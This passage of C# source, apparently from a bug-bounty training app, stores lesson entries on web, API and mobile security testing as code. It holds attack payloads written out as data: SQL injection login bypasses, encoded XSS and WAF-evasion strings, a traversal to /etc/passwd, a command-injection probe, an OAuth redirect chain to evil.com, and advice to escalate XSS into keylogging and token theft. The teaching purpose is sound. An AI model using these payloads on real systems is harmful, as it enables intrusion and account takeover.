                    new CommandItem { Text = "gospider -s https://target.com -c 10 -d 3", Explanation = "Spider website to map attack surface." },
                    new CommandItem { Text = "katana -u https://target.com -d 3 -jc -o urls.txt", Explanation = "Advanced crawler with JavaScript support." },
                    new CommandItem { Text = "paramspider -d target.com", Explanation = "Discover URL parameters from Wayback Machine." }
                },
                Steps = new List<StepItem>
                {
                    new StepItem { Number = 1, Description = "Crawl the application thoroughly", Code = "hakrawler or gospider" },
                    new StepItem { Number = 2, Description = "Map all input vectors", Code = "Forms, parameters, headers, cookies" },
                    new StepItem { Number = 3, Description = "Identify all API endpoints", Code = "Browser DevTools, LinkFinder" },
                    new StepItem { Number = 4, Description = "Categorize endpoints by function", Code = "Auth, data, admin, user, API" },
                    new StepItem { Number = 5, Description = "Prioritize high-value attack points", Code = "Authentication, financial, user data" }
                },
                Tools = new List<string> { "hakrawler", "gospider", "katana", "paramspider", "Burp Suite Spider" }
            };

            libraryTopics["Web_Params"] = new LibraryTopic
            {
                Tag = "Web_Params",
                Category = "Web Exploitation",
                Title = "Parameter Analysis Guide",
                Subtitle = "Understanding and Testing Web Parameters",
                Content = "Web parameters are how user data flows into web applications. Understanding how to discover, analyze, and test parameters is fundamental to web exploitation.\n\nParameter Types:\n1. URL query parameters: ?id=1&sort=name\n2. POST body parameters: username=admin&password=test\n3. Path parameters: /user/123/profile\n4. Cookie parameters: session=abc123\n5. HTTP header parameters: X-User-Id: 456\n6. JSON body parameters: {\"userId\": 789}\n7. XML parameters: <userId>123</userId>\n\nParameter Discovery: Not all parameters are visible in the UI. Use Param Miner Burp extension for hidden parameter discovery. Wayback Machine often has historical URLs with parameters. JavaScript files may reference undocumented parameters.\n\nParameter Manipulation: Change parameter values to test for vulnerabilities. Increment numeric IDs (IDOR). Inject special characters (SQLi, XSS). Try different parameter types (strings vs numbers). Test for parameter pollution.",
                Commands = new List<CommandItem>
                {
                    new CommandItem { Text = "ffuf -u 'https://target.com/page?FUZZ=test' -w params.txt", Explanation = "Fuzz for hidden URL parameters." },
                    new CommandItem { Text = "ffuf -u 'https://target.com/page' -X POST -d 'FUZZ=test' -w params.txt", Explanation = "Fuzz for hidden POST parameters." },
                    new CommandItem { Text = "arjun -u https://target.com/page", Explanation = "Arjun tool for automated parameter discovery." },
                    new CommandItem { Text = "python3 ParamSpider.py -d target.com", Explanation = "Discover parameters from Wayback Machine archives." },
                    new CommandItem { Text = "# In Burp Suite\n# Extensions > Param Miner > Guess headers/params", Explanation = "Param Miner extension for parameter discovery." }
                },
                Steps = new List<StepItem>
                {
                    new StepItem { Number = 1, Description = "Capture all parameters while browsing", Code = "Burp Proxy in passive mode" },
                    new StepItem { Number = 2, Description = "Discover hidden parameters", Code = "Param Miner, arjun, ffuf" },
                    new StepItem { Number = 3, Description = "Test each parameter for injection", Code = "SQLi, XSS, SSRF based on context" },
                    new StepItem { Number = 4, Description = "Test for IDOR in ID parameters", Code = "Change numeric IDs" },
                    new StepItem { Number = 5, Description = "Test for type confusion", Code = "String where number expected" }
                },
                Tools = new List<string> { "Burp Suite", "Param Miner", "arjun", "ffuf", "ParamSpider" }
            };

            libraryTopics["Web_Requests"] = new LibraryTopic
            {
                Tag = "Web_Requests",
                Category = "Web Exploitation",
                Title = "Request/Response Analysis",
                Subtitle = "Reading and Interpreting HTTP Traffic",
                Content = "Analyzing HTTP requests and responses is a core skill for web security testing. Understanding what each part of a request does and how responses reveal application behavior is essential.\n\nRequest Analysis: Method, URL, protocol version, headers, body. Understanding what each header does and whether it can be manipulated.\n\nResponse Analysis: Status code, response headers, response body. Status codes reveal application state (200, 301, 302, 401, 403, 404, 500). Headers reveal technology, caching, security policies. Body contains the actual content.\n\nComparison Analysis: Comparing responses when modifying parameters is the core technique for finding vulnerabilities. Different response (length, content, status code) when changing a parameter indicates the parameter affects behavior.\n\nTiming Analysis: Response time differences can indicate time-based injection (SQLi, blind command injection). Significant delays when injecting sleep/delay payloads confirm blind vulnerabilities.\n\nError Analysis: Error messages are information goldmines. Stack traces reveal language, framework, file paths. Database errors reveal query structure. Exception messages reveal application logic.",
                Commands = new List<CommandItem>
                {
                    new CommandItem { Text = "curl -v https://target.com 2>&1 | head -50", Explanation = "Verbose request showing all headers sent and received." },
                    new CommandItem { Text = "curl -v https://target.com 2>&1 | grep '< '", Explanation = "Show only response headers (lines starting with < )." },
                    new CommandItem { Text = "curl -w '%{http_code}\\n%{time_total}\\n' -o /dev/null -s https://target.com", Explanation = "Get status code and total request time." },
                    new CommandItem { Text = "curl 'https://target.com/?id=1' > r1.txt && curl 'https://target.com/?id=2' > r2.txt && diff r1.txt r2.txt", Explanation = "Compare responses for different parameter values." }
                },
                Steps = new List<StepItem>
                {
                    new StepItem { Number = 1, Description = "Capture all traffic in Burp Suite", Code = "Browse normally with Burp intercepting" },
                    new StepItem { Number = 2, Description = "Review response headers for security info", Code = "Server, X-Powered-By, Set-Cookie" },
                    new StepItem { Number = 3, Description = "Compare responses when modifying parameters", Code = "Note any differences in length, content, status" },
                    new StepItem { Number = 4, Description = "Check error responses for information", Code = "Trigger errors intentionally" },
                    new StepItem { Number = 5, Description = "Measure response times for blind detection", Code = "SLEEP payloads for time-based attacks" }
                },
                Tools = new List<string> { "Burp Suite", "curl", "diff", "Browser DevTools" }
            };

            libraryTopics["Web_Steps"] = new LibraryTopic
            {
                Tag = "Web_Steps",
                Category = "Web Exploitation",
                Title = "Exploitation Steps Framework",
                Subtitle = "Systematic Approach to Web Exploitation",
                Content = "Having a systematic exploitation framework ensures consistent, thorough testing and maximizes your chance of finding bugs. This framework applies to any web application target.\n\nStep 1 - Reconnaissance: Understand what the application does, what technology it uses, and map its attack surface.\n\nStep 2 - Authentication Analysis: How does the application handle authentication? Where are the weaknesses?\n\nStep 3 - Authorization Analysis: What access controls exist? Can they be bypassed?\n\nStep 4 - Input Analysis: Where does user data enter? What validation is applied?\n\nStep 5 - Output Analysis: Where is user data reflected? Is it encoded?\n\nStep 6 - Business Logic Analysis: What business rules exist? Can they be violated?\n\nStep 7 - Integration Testing: How does the app interact with external services? Are there SSRF, XXE opportunities?\n\nStep 8 - Client-Side Testing: JavaScript analysis, DOM manipulation, CSP bypass.\n\nStep 9 - Session Management: Cookie security, token validity, session handling.\n\nStep 10 - Reporting: Document findings with clear POCs.",
                Steps = new List<StepItem>
                {
                    new StepItem { Number = 1, Description = "Recon and attack surface mapping", Code = "Enumerate all endpoints and parameters" },
                    new StepItem { Number = 2, Description = "Authentication testing", Code = "Login, registration, password reset" },
                    new StepItem { Number = 3, Description = "Authorization testing", Code = "IDOR, privilege escalation" },
                    new StepItem { Number = 4, Description = "Input validation testing", Code = "SQLi, XSS, injection in all inputs" },
                    new StepItem { Number = 5, Description = "Business logic testing", Code = "Workflow bypass, value manipulation" },
                    new StepItem { Number = 6, Description = "Session and crypto testing", Code = "Cookie security, token analysis" },
                    new StepItem { Number = 7, Description = "Document and report findings", Code = "Professional reports with POCs" }
                },
                Tools = new List<string> { "Burp Suite", "nuclei", "ffuf", "sqlmap", "Autorize" }
            };

            libraryTopics["Web_Chaining"] = new LibraryTopic
            {
                Tag = "Web_Chaining",
                Category = "Web Exploitation",
                Title = "Chaining Vulnerabilities",
                Subtitle = "Combining Bugs for Higher Impact",
                Content = "Chaining vulnerabilities means combining multiple low or medium severity bugs to achieve a higher-impact attack. This demonstrates creativity and significantly increases bounty rewards.\n\nWhy Chain Vulnerabilities: A single XSS in a CSP-protected page may be low impact. But combined with a CSRF to bypass CSP and an IDOR to target specific users, it becomes critical. Chaining shows the true business impact.\n\nCommon Vulnerability Chains:\n1. Open Redirect + OAuth = Account Takeover\n2. CSRF + Privilege Escalation = Admin Access\n3. XSS + CSRF = Account Takeover\n4. SSRF + Metadata = Cloud Credentials\n5. LFI + Log Poisoning = RCE\n6. SQLi + File Read = LFI\n7. Subdomain Takeover + OAuth = Account Takeover\n8. IDOR + XSS = Stored XSS on Another User's Page\n\nThink Like an Attacker: What's the worst thing that could happen? Work backward from that goal and find the vulnerabilities that enable it.\n\nDocumenting Chains: In your report, clearly explain each step in the chain. Show how each vulnerability contributes to the final impact. This demonstrates both technical skill and business understanding.",
                Commands = new List<CommandItem>
                {
                    new CommandItem { Text = "# Chain example: Open Redirect + OAuth\n# 1. Find open redirect: /redirect?url=\n# 2. Find OAuth endpoint: /oauth?redirect_uri=\n# 3. Chain: /oauth?redirect_uri=/redirect?url=https://evil.com", Explanation = "Use open redirect to bypass redirect_uri whitelist in OAuth." }
                },
                Steps = new List<StepItem>
                {
                    new StepItem { Number = 1, Description = "List all vulnerabilities found, even low severity", Code = "Even informational findings can chain" },
                    new StepItem { Number = 2, Description = "Think about end-goal impacts", Code = "ATO, RCE, data theft" },
                    new StepItem { Number = 3, Description = "Look for connections between vulnerabilities", Code = "Does one bug enable another?" },
                    new StepItem { Number = 4, Description = "Test the chain end-to-end", Code = "Full attack path from start to impact" },
                    new StepItem { Number = 5, Description = "Report as combined vulnerability", Code = "Explain the full impact clearly" }
                },
                Tools = new List<string> { "Burp Suite", "curl", "Browser" }
            };

            libraryTopics["Web_Bypass"] = new LibraryTopic
            {
                Tag = "Web_Bypass",
                Category = "Web Exploitation",
                Title = "Bypassing Protections",
                Subtitle = "Circumventing Security Controls",
                Content = "Security controls often have gaps that can be bypassed. Understanding common bypass techniques is essential for finding vulnerabilities that less thorough testers miss.\n\nWAF Bypass Techniques: Case variations (sElEcT), comment insertion (SE/**/LECT), whitespace alternatives (SEL%09ECT), encoding (URL, Unicode, HTML), parameter pollution, HTTP method switching.\n\nCSP Bypass Techniques: Script gadgets in whitelisted domains, JSONP endpoints, Angular.js ng-template injection, trusted types bypass, base tag injection.\n\nFilter Bypass Techniques: Double encoding (%2527), null bytes (%00), path traversal variations (..../), case sensitivity, alternative representations.\n\nRedirect Bypass Techniques: Open redirects, URL parsing differences, protocol scheme variations (javascript:, data:), subdomain matching flaws.\n\nSame-Origin Policy Bypass: CORS misconfiguration, postMessage vulnerabilities, DNS rebinding, Flash/Silverlight CORS bypass (legacy).",
                Commands = new List<CommandItem>
                {
                    new CommandItem { Text = "' OR 1=1--", Explanation = "Basic SQLi, then try variations if WAF blocks." },
                    new CommandItem { Text = "' /*!OR*/ 1=1--", Explanation = "MySQL comment bypass for WAF." },
                    new CommandItem { Text = "%27%20OR%201%3D1--", Explanation = "URL encoded SQLi payload." },
                    new CommandItem { Text = "<ScRiPt>alert(1)</ScRiPt>", Explanation = "Mixed case XSS to bypass case-sensitive filters." },
                    new CommandItem { Text = "<img src=x onerror=&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;>", Explanation = "HTML entity encoded XSS event handler." },
                    new CommandItem { Text = "wafw00f https://target.com", Explanation = "Identify WAF to know what bypass techniques to try." }
                },
                Steps = new List<StepItem>
                {
                    new StepItem { Number = 1, Description = "Identify what protection is in place", Code = "WAF? Input filter? Encoding?" },
                    new StepItem { Number = 2, Description = "Test basic payload to understand the filter", Code = "See exactly what gets blocked" },
                    new StepItem { Number = 3, Description = "Try encoding variations", Code = "URL encoding, HTML encoding, Unicode" },
                    new StepItem { Number = 4, Description = "Try case and comment variations", Code = "Mixed case, SQL comments" },
                    new StepItem { Number = 5, Description = "Try alternative payload structures", Code = "Different XSS tags, alternative SQL syntax" }
                },
                Tools = new List<string> { "Burp Suite", "wafw00f", "sqlmap tamper scripts", "XSStrike" }
            };

            libraryTopics["Web_Escalate"] = new LibraryTopic
            {
                Tag = "Web_Escalate",
                Category = "Web Exploitation",
                Title = "Escalating Impact Guide",
                Subtitle = "Maximizing Vulnerability Severity",
                Content = "Impact escalation means finding ways to make a vulnerability more severe than it initially appears. This increases both the value of your report and your bounty reward.\n\nEscalation Principles: Always ask 'what's the worst thing an attacker could do with this?' Then try to do exactly that to demonstrate full impact.\n\nXSS Escalation: Basic XSS → Escalate to session hijacking → Escalate to account takeover → Escalate to persistent access. Use XSS to load a keylogger, steal tokens, make authenticated requests.\n\nIDOR Escalation: Read access → Write access → Delete access → Admin access. Can you modify data? Can you delete records? Can you modify admin accounts?\n\nSSRF Escalation: Blind SSRF → Read internal services → Access cloud metadata → Get credentials → Full AWS account compromise.\n\nSQL Injection Escalation: Data extraction → Read files on server → Write files to server → Execute OS commands (xp_cmdshell in MSSQL, INTO OUTFILE in MySQL with write permissions).",
                Steps = new List<StepItem>
                {
                    new StepItem { Number = 1, Description = "Confirm basic vulnerability", Code = "Prove the vulnerability exists" },
                    new StepItem { Number = 2, Description = "Ask what's the worst possible impact", Code = "ATO, RCE, data breach?" },
                    new StepItem { Number = 3, Description = "Try to achieve that worst impact", Code = "Step-by-step escalation" },
                    new StepItem { Number = 4, Description = "Document each escalation step", Code = "Show the full attack chain" },
                    new StepItem { Number = 5, Description = "Report with full impact demonstrated", Code = "Higher impact = higher bounty" }
                },
                Tools = new List<string> { "Burp Suite", "XSS Hunter", "Burp Collaborator" }
            };

            libraryTopics["Web_Auth"] = new LibraryTopic
            {
                Tag = "Web_Auth",
                Category = "Web Exploitation",
                Title = "Authentication Bypass Techniques",
                Subtitle = "Breaking Into Applications Without Valid Credentials",
                Content = "Authentication bypass allows access to protected resources without valid credentials. There are many techniques depending on the authentication mechanism used.\n\nSQL Injection Auth Bypass: Injecting SQL into login fields to manipulate the query. Classic: ' OR 1=1-- makes the WHERE clause always true.\n\nDefault Credentials: Try admin/admin, admin/password, test/test, administrator/administrator on any login form, especially admin panels.\n\nPassword Reset Bypass: Manipulate reset tokens, skip token validation, host header injection to control reset email destination.\n\nResponse Manipulation: If login returns {\"success\": false}, change it to {\"success\": true} in Burp. Some applications validate login client-side only.\n\nMFA Bypass: Navigate directly to post-login URL, race condition in MFA verification, backup code brute force, MFA code in response.\n\nJWT Manipulation: None algorithm, weak secret, algorithm confusion attacks to forge valid tokens.\n\nOAuth Flaws: State parameter missing (CSRF), redirect_uri manipulation, token leakage.",
                Commands = new List<CommandItem>
                {
                    new CommandItem { Text = "admin' OR '1'='1", Explanation = "SQL injection in username field for auth bypass." },
                    new CommandItem { Text = "' OR 1=1--", Explanation = "Classic SQLi auth bypass." },
                    new CommandItem { Text = "admin'--", Explanation = "Comment out password check. Works if username exists." },
                    new CommandItem { Text = "curl -d 'user=admin&pass=admin' https://target.com/login", Explanation = "Test default admin credentials." }
                },
                Steps = new List<StepItem>
                {
                    new StepItem { Number = 1, Description = "Test SQL injection in login fields", Code = "' OR 1=1-- in username" },
                    new StepItem { Number = 2, Description = "Try default credentials", Code = "admin/admin, admin/password" },
                    new StepItem { Number = 3, Description = "Test password reset for token flaws", Code = "Weak tokens, no expiry" },
                    new StepItem { Number = 4, Description = "Intercept response and modify success flag", Code = "Burp: change false to true" },
                    new StepItem { Number = 5, Description = "Test MFA bypass by skipping to next page", Code = "Navigate directly to /dashboard" }
                },
                Tools = new List<string> { "Burp Suite", "Hydra", "sqlmap", "jwt_tool" }
            };

            libraryTopics["Web_Session"] = new LibraryTopic
            {
                Tag = "Web_Session",
                Category = "Web Exploitation",
                Title = "Session Management Attacks",
                Subtitle = "Attacking Session Tokens and Cookies",
                Content = "Session management is a common source of vulnerabilities. Weak, predictable, or improperly handled session tokens can lead to account takeover.\n\nSession Token Properties: Should be random, long (128+ bits), unique per session, regenerated after login, and invalidated on logout.\n\nSession Fixation: Attacker sets a known session token for a victim. Victim logs in. Attacker uses the known token, now authenticated as victim. Prevent by regenerating session token after login.\n\nSession Hijacking: Steal victim's session cookie. Transport via XSS (if not HttpOnly), sniffing (if not HTTPS), or server logs.\n\nCookie Security Flags: Secure (only over HTTPS), HttpOnly (no JavaScript access), SameSite (Strict/Lax reduces CSRF). All should be set on session cookies.\n\nPredictable Session Tokens: Old applications sometimes use MD5(timestamp) or sequential IDs for sessions. These can be predicted or brute forced.\n\nSession After Logout: Test if old session token works after logging out. Should be invalidated server-side.",
                Commands = new List<CommandItem>
                {
                    new CommandItem { Text = "curl -v https://target.com/login | grep -i 'set-cookie'", Explanation = "Check cookie flags after login." },
                    new CommandItem { Text = "curl -c cookies.txt https://target.com/login -d 'user=a&pass=b'\ncurl -b cookies.txt https://target.com/logout\ncurl -b cookies.txt https://target.com/dashboard", Explanation = "Test if session is valid after logout." },
                    new CommandItem { Text = "curl https://target.com/login1 -c c1.txt && curl https://target.com/login2 -c c2.txt && diff c1.txt c2.txt", Explanation = "Compare session tokens from two logins to check randomness." }
                },
                Steps = new List<StepItem>
                {
                    new StepItem { Number = 1, Description = "Check cookie security flags", Code = "Secure, HttpOnly, SameSite" },
                    new StepItem { Number = 2, Description = "Test session invalidation on logout", Code = "Use old cookie after logout" },
                    new StepItem { Number = 3, Description = "Check if token regenerates after login", Code = "Compare pre-login and post-login tokens" },
                    new StepItem { Number = 4, Description = "Analyze token for predictability", Code = "Is it sequential, timestamp-based?" },
                    new StepItem { Number = 5, Description = "Test session fixation", Code = "Set known session, have victim log in" }
                },
                Tools = new List<string> { "Burp Suite", "curl", "Browser DevTools" }
            };

            libraryTopics["Web_Access"] = new LibraryTopic
            {
                Tag = "Web_Access",
                Category = "Web Exploitation",
                Title = "Access Control Testing",
                Subtitle = "Testing Authorization and Permission Systems",
                Content = "Access control determines what authenticated users can and cannot do. Broken access control is one of the most common and impactful vulnerability classes.\n\nTypes of Access Control:\n1. Vertical access control - Different privileges between user roles (user vs admin)\n2. Horizontal access control - Same privilege level, different users' data\n3. Context-dependent access control - Application state determines access\n\nTesting Approach: Create accounts with different privilege levels. Map all endpoints. Test each endpoint from each privilege level. Test IDOR in all object references.\n\nForced Browsing: Try accessing admin or privileged pages directly without going through normal UI. /admin, /admin/users, /api/admin.\n\nParameter-based Access: Some applications control access through request parameters (isAdmin=false). Change these parameters to bypass controls.\n\nRole-based Testing: If you have admin credentials (from test account), enumerate admin functionality. Then test if regular user can access those functions.\n\nAutorize Burp Extension: Excellent for automated access control testing. Captures admin requests and automatically replays them with lower-privilege session.",
                Commands = new List<CommandItem>
                {
                    new CommandItem { Text = "curl 'https://target.com/admin' -H 'Cookie: REGULAR_USER_SESSION'", Explanation = "Test if admin pages are accessible to regular users." },
                    new CommandItem { Text = "curl 'https://target.com/api/users' -H 'Cookie: REGULAR_USER_SESSION'", Explanation = "Test if admin API endpoints are accessible to regular users." },
                    new CommandItem { Text = "# Autorize extension in Burp\n# Sets up automatic re-testing with different sessions", Explanation = "Autorize automates access control testing across all requests." }
                },
                Steps = new List<StepItem>
                {
                    new StepItem { Number = 1, Description = "Create admin and regular user test accounts", Code = "Two distinct privilege levels" },
                    new StepItem { Number = 2, Description = "Map all admin functionality as admin", Code = "Document all admin URLs and APIs" },
                    new StepItem { Number = 3, Description = "Test each admin function as regular user", Code = "Autorize or manual testing" },
                    new StepItem { Number = 4, Description = "Test IDOR on all object references", Code = "Access other users' resources" },
                    new StepItem { Number = 5, Description = "Try forced browsing to admin areas", Code = "Direct URL access without going through UI" }
                },
                Tools = new List<string> { "Burp Suite", "Autorize extension", "curl" }
            };

            libraryTopics["Web_Input"] = new LibraryTopic
            {
                Tag = "Web_Input",
                Category = "Web Exploitation",
                Title = "Input Validation Encyclopedia",
                Subtitle = "Testing All Input Validation Points",
                Content = "Input validation testing systematically tests every input point for every relevant vulnerability class. This is the core of web application security testing.\n\nInput Contexts: HTML body, HTML attribute, JavaScript context, URL, CSS, SQL query, XML, file system, OS command. Each context requires different payloads and testing approaches.\n\nSpecial Characters to Test: Single quote ('), double quote (\"), angle brackets (<>), ampersand (&), semicolon (;), pipe (|), backtick (`), dollar sign ($), backslash (\\).\n\nAutomatic vs Manual: Automated scanners (Burp Scanner, nuclei) find obvious issues but miss context-specific and logic vulnerabilities. Manual testing is irreplaceable for complex applications.\n\nFuzzing Strategy: Use wordlists of injection payloads for each vulnerability class. Burp Intruder, FFUF, and SQLMap all support payload lists. SecLists has excellent fuzzing payloads.",
                Commands = new List<CommandItem>
                {
                    new CommandItem { Text = "# Test each parameter with all injection types\n# 1. SQLi: ' AND 1=1--\n# 2. XSS: <script>alert(1)</script>\n# 3. SSTI: {{7*7}}\n# 4. Command: ; id\n# 5. Path traversal: ../../../etc/passwd", Explanation = "Systematic injection testing across all vulnerability classes." },
                    new CommandItem { Text = "ffuf -u 'https://target.com/?q=FUZZ' -w /usr/share/seclists/Fuzzing/XSS-Jhaddix.txt", Explanation = "XSS fuzzing with SecLists XSS payloads." },
                    new CommandItem { Text = "ffuf -u 'https://target.com/?q=FUZZ' -w /usr/share/seclists/Fuzzing/SQLi/Generic-SQLi.txt", Explanation = "SQL injection fuzzing with SecLists SQLi payloads." }
                },
                Steps = new List<StepItem>
                {
                    new StepItem { Number = 1, Description = "Identify all input parameters", Code = "Forms, URL params, cookies, headers" },
                    new StepItem { Number = 2, Description = "Determine input context", Code = "HTML, JS, SQL, URL, command" },
                    new StepItem { Number = 3, Description = "Test each input with relevant payloads", Code = "Context-appropriate injection attempts" },
                    new StepItem { Number = 4, Description = "Fuzz with automated tools", Code = "ffuf, Burp Intruder" },
                    new StepItem { Number = 5, Description = "Manually verify promising results", Code = "Confirm and develop working POC" }
                },
                Tools = new List<string> { "Burp Suite", "ffuf", "sqlmap", "XSStrike", "SecLists" }
            };

            libraryTopics["Web_Output"] = new LibraryTopic
            {
                Tag = "Web_Output",
                Category = "Web Exploitation",
                Title = "Output Encoding Guide",
                Subtitle = "Understanding Output Encoding and XSS Prevention",
                Content = "Understanding how applications encode output is essential for finding XSS vulnerabilities and understanding why some injection attempts succeed or fail.\n\nOutput Contexts and Required Encoding:\n1. HTML body: &, <, >, \", ' must be HTML encoded\n2. HTML attribute: Additional encoding needed for quotes\n3. JavaScript string: Backslash escaping needed\n4. URL: Percent encoding\n5. CSS: Hex encoding\n\nMissing Encoding Finding XSS: When an application reflects user input without proper encoding for its context, XSS is possible. The key is understanding what encoding is missing for the specific context.\n\nContent-Type Headers: Content-Type header tells browser how to interpret response. text/html enables HTML rendering. application/json should prevent HTML rendering. Missing or wrong Content-Type can enable XSS.\n\nDOM XSS: Occurs when JavaScript uses unsafe APIs with attacker-controlled data. innerHTML, document.write, eval, setTimeout with string, and jQuery's $() are common sinks. Sources include location.hash, location.search, document.referrer.",
                Commands = new List<CommandItem>
                {
                    new CommandItem { Text = "curl 'https://target.com/search?q=<test>' | grep '<test>'", Explanation = "Check if input is reflected without encoding." },
                    new CommandItem { Text = "# Check for DOM XSS sources in JS\ngrep -r 'location.hash\\|document.URL\\|location.search' *.js", Explanation = "Find DOM XSS sources in JavaScript files." },
                    new CommandItem { Text = "# Check for dangerous sinks\ngrep -r 'innerHTML\\|document.write\\|eval(' *.js", Explanation = "Find dangerous DOM XSS sinks in JavaScript." }
                },
                Steps = new List<StepItem>
                {
                    new StepItem { Number = 1, Description = "Check how input is reflected in response", Code = "View source to see exact context" },
                    new StepItem { Number = 2, Description = "Determine the output context", Code = "HTML body, attribute, JavaScript, URL" },
                    new StepItem { Number = 3, Description = "Check if appropriate encoding is applied", Code = "Is < encoded as &lt;?" },
                    new StepItem { Number = 4, Description = "Test for DOM XSS separately", Code = "Check URL fragments (hash), JS sources" },
                    new StepItem { Number = 5, Description = "Check Content-Type of responses", Code = "Wrong MIME type can enable XSS" }
                },
                Tools = new List<string> { "Burp Suite", "DOM Invader (Burp)", "Browser DevTools" }
            };
        }



        private void InitializeAdvancedTopics()
        {
            libraryTopics["Advanced_API"] = new LibraryTopic
            {
                Tag = "Advanced_API",
                Category = "Advanced Topics",
                Title = "API Security Complete Guide",
                Subtitle = "Testing REST, GraphQL, and Other APIs",
                Content = "APIs are increasingly the primary interface for web applications and represent a massive attack surface often with weaker security than traditional web UIs. API security testing is a specialized and high-value skill.\n\nAPI Types: REST (JSON/XML over HTTP), GraphQL (flexible query language), SOAP (XML-based), gRPC (protocol buffers), WebSocket (bidirectional real-time).\n\nOWASP API Security Top 10:\n1. Broken Object Level Authorization (BOLA/IDOR) - Access other users' objects\n2. Broken Authentication - Weak auth mechanisms\n3. Excessive Data Exposure - API returns more data than needed\n4. Lack of Resources & Rate Limiting - No throttling\n5. Broken Function Level Authorization - Access admin functions\n6. Mass Assignment - Bind request body to data model without filtering\n7. Security Misconfiguration - Permissive CORS, default credentials\n8. Injection - SQLi, NoSQLi, command injection in API params\n9. Improper Assets Management - Old unpatched API versions\n10. Insufficient Logging & Monitoring\n\nAPI Discovery: Swagger/OpenAPI docs, Postman collections shared publicly, JavaScript bundle analysis, Wayback Machine, GitHub search for API endpoints.\n\nTesting Tools: Postman for manual API testing, Burp Suite for intercepting, mitmproxy, kiterunner for API endpoint brute force, nuclei API templates.\n\nAPI Authentication: Test for missing auth on endpoints, JWT vulnerabilities, OAuth flows, API key exposure, and broken function-level authorization by swapping user roles.",
                Commands = new List<CommandItem>
                {
                    new CommandItem { Text = "kiterunner scan https://target.com/api -w routes-large.kite", Explanation = "Brute force API endpoints using kiterunner with API-specific wordlists." },
                    new CommandItem { Text = "curl -X GET 'https://target.com/api/v1/users' -H 'Authorization: Bearer TOKEN'", Explanation = "Test authenticated API endpoint." },
                    new CommandItem { Text = "curl -X POST 'https://target.com/api/v1/user/1' -d '{\"role\":\"admin\"}' -H 'Content-Type: application/json'", Explanation = "Test mass assignment by sending extra fields in request body." },
                    new CommandItem { Text = "ffuf -u https://target.com/api/FUZZ -w api_wordlist.txt -mc 200,201,204", Explanation = "Fuzz for undocumented API endpoints." },
                    new CommandItem { Text = "curl 'https://target.com/api/v1/user/1' -H 'X-HTTP-Method-Override: DELETE'", Explanation = "Test HTTP method override headers for bypassing restrictions." },
                    new CommandItem { Text = "curl 'https://target.com/api/v2/endpoint' && curl 'https://target.com/api/v1/endpoint'", Explanation = "Test old API versions that may have weaker security." },
                    new CommandItem { Text = "nuclei -u https://target.com -t ~/nuclei-templates/exposures/apis/", Explanation = "Scan for exposed API docs and configurations with nuclei." }
                },
                Steps = new List<StepItem>
                {
                    new StepItem { Number = 1, Description = "Discover all API endpoints and documentation", Code = "Check /swagger.json, /api-docs, /openapi.json" },
                    new StepItem { Number = 2, Description = "Map authentication requirements per endpoint", Code = "Which endpoints require auth? Which don't?" },
                    new StepItem { Number = 3, Description = "Test BOLA/IDOR on all object references", Code = "Change user IDs, resource IDs in API calls" },
                    new StepItem { Number = 4, Description = "Test for excessive data exposure", Code = "Does API return fields not shown in UI?" },
                    new StepItem { Number = 5, Description = "Test mass assignment vulnerabilities", Code = "Add extra fields like 'role', 'isAdmin' to requests" },
                    new StepItem { Number = 6, Description = "Test old API versions", Code = "/api/v1/ vs /api/v2/ vs /api/v3/" },
                    new StepItem { Number = 7, Description = "Check CORS policy configuration", Code = "Send cross-origin requests and check Access-Control headers" }
                },
                Tools = new List<string> { "Postman", "Burp Suite", "kiterunner", "mitmproxy", "nuclei", "ffuf", "Insomnia" },
                Resources = new List<string>
                {
                    "https://owasp.org/www-project-api-security/",
                    "https://github.com/assetnote/kiterunner",
                    "https://portswigger.net/burp/documentation/desktop/testing-workflow/working-with-apis",
                    "https://github.com/shieldfy/API-Security-Checklist"
                }
            };

            libraryTopics["Advanced_Mobile"] = new LibraryTopic
            {
                Tag = "Advanced_Mobile",
                Category = "Advanced Topics",
                Title = "Mobile App Testing",
                Subtitle = "Security Testing for iOS and Android Applications",
                Content = "Mobile application security testing is a growing and lucrative area of bug bounty. Mobile apps often communicate with the same backend APIs as web apps but may have additional attack surfaces including local storage, hardcoded secrets, and certificate pinning bypass.\n\nAndroid Testing: Android apps (.apk files) can be decompiled using apktool, jadx, and dex2jar. The AndroidManifest.xml reveals permissions, exported activities, and components. Sensitive data may be stored in SharedPreferences, SQLite databases, or internal storage.\n\niOS Testing: iOS apps (.ipa files) require a jailbroken device or simulator for dynamic testing. Binary analysis with class-dump reveals class structures. Frida hooks into running apps without jailbreak in some cases.\n\nCommon Mobile Vulnerabilities:\n1. Hardcoded credentials or API keys in app code\n2. Insecure data storage (plaintext in databases, logs, SharedPreferences)\n3. Insecure communication (HTTP, certificate pinning bypass)\n4. Insecure authentication (biometric bypass, weak session tokens)\n5. Improper session handling\n6. Exported activities/content providers (Android)\n7. JavaScript injection in WebViews\n8. Weak cryptography implementations\n\nTools Overview: MobSF for automated analysis, Burp Suite for traffic interception, Frida for dynamic instrumentation, apktool/jadx for Android static analysis, objection for iOS dynamic analysis.\n\nCertificate Pinning: Apps that implement certificate pinning reject Burp's CA certificate. Bypass with Frida scripts, objection, or patching the APK to remove pinning code.",
                Commands = new List<CommandItem>
                {
                    new CommandItem { Text = "apktool d target.apk -o decompiled/", Explanation = "Decompile Android APK to smali code and resources." },
                    new CommandItem { Text = "jadx -d output/ target.apk", Explanation = "Decompile APK to readable Java source code." },
                    new CommandItem { Text = "grep -r 'api_key\\|password\\|secret\\|token' decompiled/ --include='*.smali'", Explanation = "Search decompiled code for hardcoded secrets." },
                    new CommandItem { Text = "adb shell am start -n com.target.app/.MainActivity", Explanation = "Launch specific Android activity via ADB." },
                    new CommandItem { Text = "adb pull /data/data/com.target.app/databases/ .", Explanation = "Pull app databases from rooted Android device." },
                    new CommandItem { Text = "frida -U -l bypass_pinning.js -f com.target.app", Explanation = "Use Frida to bypass certificate pinning on Android." },
                    new CommandItem { Text = "objection -g com.target.app explore", Explanation = "Launch Objection for runtime mobile app analysis." },
                    new CommandItem { Text = "python3 -m mobsf", Explanation = "Launch Mobile Security Framework for automated analysis." },
                    new CommandItem { Text = "adb logcat | grep -i 'password\\|token\\|secret'", Explanation = "Monitor Android log output for sensitive data leaks." }
                },
                Steps = new List<StepItem>
                {
                    new StepItem { Number = 1, Description = "Download and decompile the target APK", Code = "apktool d target.apk && jadx -d output/ target.apk" },
                    new StepItem { Number = 2, Description = "Search for hardcoded secrets", Code = "grep -r 'api_key\\|password\\|secret' decompiled/" },
